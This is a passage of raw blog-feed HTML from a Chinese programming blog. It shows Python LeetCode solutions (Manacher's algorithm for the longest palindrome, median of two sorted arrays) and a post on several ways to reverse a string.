class="hljs-number">2</span> == <span class="hljs-number">1</span>:</span><br><span class="line">                start = (i<span class="hljs-number">-1</span>) // <span class="hljs-number">2</span></span><br><span class="line">                end = start + <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(s[start] == s[end]):</span><br><span class="line">                    <span class="hljs-keyword">while</span> start &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> end &lt; len(s)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> s[start<span class="hljs-number">-1</span>] == s[end+<span class="hljs-number">1</span>]:</span><br><span class="line">                        start -= <span class="hljs-number">1</span></span><br><span class="line">                        end += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                start = end = i // <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> start &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> end &lt; len(s)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> s[start<span class="hljs-number">-1</span>] == s[end+<span class="hljs-number">1</span>]:</span><br><span class="line">                    start -= <span class="hljs-number">1</span></span><br><span class="line">                    end +=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (end-start+<span class="hljs-number">1</span>) &gt; max_len <span class="hljs-keyword">and</span> s[start]==s[end]:</span><br><span class="line">                max_len = end-start+<span class="hljs-number">1</span></span><br><span class="line">                max_str = s[start:end+<span class="hljs-number">1</span>] </span><br><span class="line">        <span class="hljs-keyword">return</span> max_str</span><br></pre></td></tr></table></figure></p><h5 id="解法5：Manacher’s-Algorithm-马拉车算法"><a href="#解法5：Manacher’s-Algorithm-马拉车算法" class="headerlink" title="解法5：Manacher’s Algorithm 马拉车算法"></a>解法5：Manacher’s Algorithm 马拉车算法</h5><pre><code>解法5 转自 LeetCode 用户 windliang 的题解。</code></pre><p>马拉车算法<strong>Manacher‘s Algorithm</strong>是用来查找一个字符串的最长回文子串的线性方法，由一个叫 Manacher 的人在 1975 年发明的，这个方法的最大贡献是在于将时间复杂度提升到了线性。</p><h6 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h6><p>首先我们解决下奇数和偶数的问题，在每个字符间插入”#”，并且为了使得扩展的过程中，到边界后自动结束，在两端分别插入”^”和 “$”，两个不可能在字符串中出现的字符，这样中心扩展的时候，判断两端字符是否相等的时候，如果到了边界就一定会不相等，从而出了循环。经过处理，字符串的长度永远都是奇数了。<br><img src="/2019/11/16/leetcode-day3/2.jpg" alt="2.jpg"></p><p>我们用一个数组P保存从中心扩展的最大个数，而它刚好也是去掉”#”的<strong>原字符串的总长度</strong>。例如下图中下标是6的地方，可以看到<code>P[6]</code>等于5，所以它是从左边扩展5个字符，相应的右边也是扩展5个字符，也就是<code>#c#b#c#b#c#</code>。而去掉#恢复到原来的字符串，变成<code>cbcbc</code>，它的长度刚好也就是5。<br><img src="/2019/11/16/leetcode-day3/3.png" alt="3.jpg"></p><h6 id="求原字符串下标"><a href="#求原字符串下标" class="headerlink" title="求原字符串下标"></a>求原字符串下标</h6><p>用P的下标减去<code>P[i]</code>，再模2，就是原字符串的开头字符下标了。<br>例如我们找到<code>P[i]</code>的最大值为5，也就是回文串的最大长度是5，对应的下标是6，所以原字符串的开头下标是<code>(6 - 5)/ 2 = 0</code>。所以我们只需要返回原字符串的<code>s[0:5]</code>就可以了。</p><h6 id="求每个P-i"><a href="#求每个P-i" class="headerlink" title="求每个P[i]"></a>求每个<code>P[i]</code></h6><pre><code>接下来是算法的关键了，它充分了利用了回文串的对称性。</code></pre><p>我们用<code>C</code>表示回文串的中心，用<code>R</code>表示回文串的右边半径。所以<code>R = C + P[i]</code>。<code>C</code>和<code>R</code>所对应的回文串是当前循环中<code>R</code>最靠右的回文串。</p><p><img src="/2019/11/16/leetcode-day3/4.png" alt="4.jpg"><br>我们考虑求<code>P[i]</code>的时候，用<code>i_mirror</code>表示当前需要求的第<code>i</code>个字符关于<code>C</code>对应的下标。<br>现在要求<code>P[i]</code>，如果是用中心扩展法，那就向两边扩展比对就行了。但是我们其实可以利用回文串<code>C</code>的对称性。<code>i</code>关于<code>C</code>的对称点是<code>i_mirror</code>，<code>P[i_mirror] = 3</code>，所以<code>P[i]</code> 也等于3。<br>但是有三种情况将会造成直接赋值为<code>P[i_mirror]</code>是不正确的，下边一一讨论。<br><strong>1. 超出了<code>R</code></strong><br><img src="/2019/11/16/leetcode-day3/5.png" alt="5.jpg"><br>当我们要求<code>P[i]</code>的时候，<code>P[mirror] = 7</code>，而此时<code>P[i]</code>并不等于7，为什么呢，因为我们从<code>i</code>开始往后数7个，等于22，已经超过了最右的<code>R</code>，此时不能利用对称性了，但我们一定可以扩展到<code>R</code>的，所以<code>P[i]</code>至少等于<code>R - i = 20 - 15 = 5</code>，会不会更大呢，我们只需要比较<code>T[R+1]</code>和<code>T[R+1]关于 i 的对称点</code>就行了，就像中心扩展法一样一个个扩展。<br><strong>2. <code>P[i_mirror]</code>遇到了原字符串的左边界</strong><br><img src="/2019/11/16/leetcode-day3/6.png" alt="6.jpg"><br>此时<code>P[i_mirror] = 1</code>，但是<code>P[i]</code>赋值成1是不正确的，出现这种情况的原因是<code>P[i_mirror]</code>在扩展的时候首先是<code>&#39;#&#39; == &#39;#&#39;</code>，之后遇到了 <code>&#39;^&#39;</code> 和另一个字符比较，也就是到了边界，才终止循环的。而<code>P[i]</code>并没有遇到边界，所以我们可以继续通过中心扩展法一步一步向两边扩展就行了。<br><strong>2. <code>i == R</code></strong><br>此时我们先把<code>P[i]</code>赋值为0，然后通过中心扩展法一步一步扩展就行了。</p><h6 id="考虑C和R的更新"><a href="#考虑C和R的更新" class="headerlink" title="考虑C和R的更新"></a>考虑<code>C</code>和<code>R</code>的更新</h6><p>就这样一步一步的求出每个<code>P[i]</code>，当求出的<code>P[i]</code>的右边界大于当前的<code>R</code>时，我们就需要更新<code>C</code>和<code>R</code>为当前的回文串了。因为我们必须保证<code>i</code>在<code>R</code>里面，所以一旦有更右边的<code>R</code>就要更新<code>R</code>。<br><img src="/2019/11/16/leetcode-day3/7.jpg" alt="7.jpg"><br>此时的<code>P[i]</code>求出来将会是3，<code>P[i]</code>对应的右边界将是<code>10 + 3 = 13</code>，所以大于当前的<code>R</code>，我们需要把<code>C</code>更新成<code>i</code>的值，也就是10，<code>R</code>更新成13。继续下边的循环。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-comment">#字符串预处理</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">preprocess</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">'$'</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ret = <span class="hljs-string">'^'</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):</span><br><span class="line">                ret += <span class="hljs-string">'#'</span>+s[i]</span><br><span class="line">            <span class="hljs-keyword">return</span> ret + <span class="hljs-string">'#$'</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-comment">#预处理</span></span><br><span class="line">        t = self.preprocess(s)</span><br><span class="line">        P, C, R = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t))], <span class="hljs-number">0</span>, <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(t)<span class="hljs-number">-1</span>):</span><br><span class="line">            i_mirror = <span class="hljs-number">2</span>*C-i</span><br><span class="line">            <span class="hljs-keyword">if</span>(R&gt;i): <span class="hljs-comment">#保证i在R内</span></span><br><span class="line">                P[i] = min(R-i, P[i_mirror])</span><br><span class="line">            <span class="hljs-keyword">else</span>: <span class="hljs-comment">#i&lt;=R的时候</span></span><br><span class="line">                P[i] = <span class="hljs-number">0</span></span><br><span class="line">            <span class="hljs-comment">#上面说的三种情况</span></span><br><span class="line">            <span class="hljs-comment">#因为其余情况下P[i]已确定，因此不会进入循环</span></span><br><span class="line">            <span class="hljs-keyword">while</span> t[i+<span class="hljs-number">1</span>+P[i]] == t[i<span class="hljs-number">-1</span>-P[i]]:</span><br><span class="line">                P[i]+=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-comment">#更新C和R</span></span><br><span class="line">            <span class="hljs-keyword">if</span> i + P[i] &gt; R:</span><br><span class="line">                C = i</span><br><span class="line">                R = i + P[i]</span><br><span class="line">        len_max = <span class="hljs-number">0</span></span><br><span class="line">        centerIndex = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, len(t)<span class="hljs-number">-1</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> P[i] &gt; len_max:</span><br><span class="line">                len_max = P[i]</span><br><span class="line">                centerIndex = i</span><br><span class="line">        <span class="hljs-comment">#根据公式计算start</span></span><br><span class="line">        start = (centerIndex - len_max)/<span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">return</span> s[start:start+len_max]</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这些题都好难啊…越来越觉得自己是个铁fw了…呜呜呜&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>Python实现字符串反转的几种方法</title>
    <link href="https://fansblog.club/2019/11/15/py-str-reverse/"/>
    <id>https://fansblog.club/2019/11/15/py-str-reverse/</id>
    <published>2019-11-15T08:23:41.000Z</published>
    <updated>2019-11-15T09:16:52.256Z</updated>
    
    <content type="html"><![CDATA[<p>你能想到几种？<a id="more"></a></p><h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p><h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p><h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p><h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line"><span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line"><span class="hljs-keyword">return</span> s</span><br><span class="line"><span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p><h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line"><span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">l = list(s)</span><br><span class="line">ans = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line"><span class="hljs-comment">#模拟出栈</span></span><br><span class="line">ans += l.pop()</span><br><span class="line"><span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p><h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">ans = <span class="hljs-string">''</span></span><br><span class="line">max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">ans += s[max_index-index]</span><br><span class="line"><span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><hr><p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;你能想到几种？&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 2 (4)</title>
    <link href="https://fansblog.club/2019/11/14/leetcode-day2/"/>
    <id>https://fansblog.club/2019/11/14/leetcode-day2/</id>
    <published>2019-11-14T05:59:09.000Z</published>
    <updated>2020-01-08T02:21:25.631Z</updated>
    
    <content type="html"><![CDATA[<p>LeetCode系列 昨天只做了一道题 失败的一天<a id="more"></a><br>但每天的总结不能停啊…</p><h3 id="4-寻找两个有序数组的中位数（困难）"><a href="#4-寻找两个有序数组的中位数（困难）" class="headerlink" title="4. 寻找两个有序数组的中位数（困难）"></a>4. 寻找两个有序数组的中位数（困难）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定两个大小为m和n的有序数组nums1和nums2。<br>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为O(log(m + n))。<br>你可以假设nums1和nums2不会同时为空。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">则中位数是 2.0</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">则中位数是 (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1-定义第三个数组重排序"><a href="#解法1-定义第三个数组重排序" class="headerlink" title="解法1: 定义第三个数组重排序"></a>解法1: 定义第三个数组重排序</h5><p>一开始看到这道题很自然的想到再多定义一个列表数组将两个数组重排序，但是像python里的sort方法就不用了，这样就没意思了。具体代码如下。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(m+n)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        nums3 = []</span><br><span class="line">        mid = (len(nums1)+len(nums2))//<span class="hljs-number">2</span></span><br><span class="line">        flag = (len(nums1)+len(nums2))%<span class="hljs-number">2</span></span><br><span class="line">        i, j= <span class="hljs-number">0</span>, <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(i&lt;len(nums1) <span class="hljs-keyword">and</span> j&lt;len(nums2)):</span><br><span class="line">            <span class="hljs-keyword">if</span> nums1[i]&gt;nums2[j]:</span><br><span class="line">                nums3.append(nums2[j])</span><br><span class="line">                j+=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                nums3.append(nums1[i])</span><br><span class="line">                i+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(i&lt;len(nums1)):</span><br><span class="line">            nums3.append(nums1[i])</span><br><span class="line">            i+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(j&lt;len(nums2)):</span><br><span class="line">            nums3.append(nums2[j])</span><br><span class="line">            j+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">return</span> nums3[mid]</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (nums3[mid<span class="hljs-number">-1</span>]+nums3[mid])/<span class="hljs-number">2</span></span><br></pre></td></tr></table></figure><br>但是题目的要求时间复杂度为$O(log(m+n))$，虽然提交成功了，但我们需要降低时间复杂度啊…一看到log，那肯定是要用到二分法啊，看了评论区大佬的解答，还有下面两种解法。</p><h5 id="解法2：取第k小的数"><a href="#解法2：取第k小的数" class="headerlink" title="解法2：取第k小的数"></a>解法2：取第k小的数</h5><p>所谓取中位数，那么不就是取第k小的数吗，如果是奇数，那就是取最中间那个数，也就是<code>k = (m+n+1)/2</code>，如果是偶数，那就是取<code>k1 = (m+n+1)/2</code>和<code>k2 =（m+n+2)/2</code>位置数的平均值。<br>这里可以用到一个小trick，因为当数组维数是奇数的时候，(m+n+1)是偶数，我们进行的又是模2运算，因此变成<code>k = (m+n+2)/2</code>和原来是相等的，这样也变成和偶数时一样的k1和k2，就可以不用分情况讨论了。<br>所以接下来我们所要求的就是第k1小的和第k2小的数，然后二者相加除以二就是我们最终的答案了。<br>那接下来问题就转化为如何在两个数组中求第k小的数，题目要求中时间复杂度要为$O(log(m+n))$，因此我们要用到二分法，也就是说，我们可以在两个数组中分别取前<code>k/2</code>个数（因为是有序数组嘛，前<code>k/2</code>也就是<code>k/2</code>个较小的，降序反之亦然），比较取出的这两组数据的最后一位哪个更小，我们便去掉该<code>k/2</code>个，如果相等就随便去掉那一组都可以。但是还有一个问题：当某一组数不够<code>k/2</code>的时候，那就将其最后一个数与另一组第<code>k/2</code>个比较，如果这组数都被淘汰了，那就剩一组数据了，在一组数据中取第k小的数就可以直接return了。因此在取<code>k/2</code>之前我们还要判断数组的数量够不够。之后进行递归，因为去掉了<code>k/2</code>个数，因此下一轮的<code>k = k - k/2</code>，直到当<code>k = 1</code>时，递归结束，这时候每组数据都取了一个，<code>k = 1</code>的意思不就是取最小的数嘛，所以只要比较这两个数哪一个更小，哪一个就是答案。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#O(log(m+n))</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        m = len(nums1)</span><br><span class="line">        n = len(nums2)</span><br><span class="line">        left = (m+n+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span></span><br><span class="line">        right = (m+n+<span class="hljs-number">2</span>)//<span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">return</span> (self.findKth(nums1, nums2, left) + self.findKth(nums1, nums2, right))/<span class="hljs-number">2</span></span><br><span class="line">    <span class="hljs-comment"># 取第k小的数</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findKth</span><span class="hljs-params">(self, nums1, nums2, k)</span>:</span></span><br><span class="line">    <span class="hljs-comment"># 注意判断列表为空时不能用 nums1 == None</span></span><br><span class="line">    <span class="hljs-comment"># 因为取第k小的数一定有答案，因此不存在两个数组都为空的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums1) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> nums2[k<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums2) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> nums1[k<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-comment"># 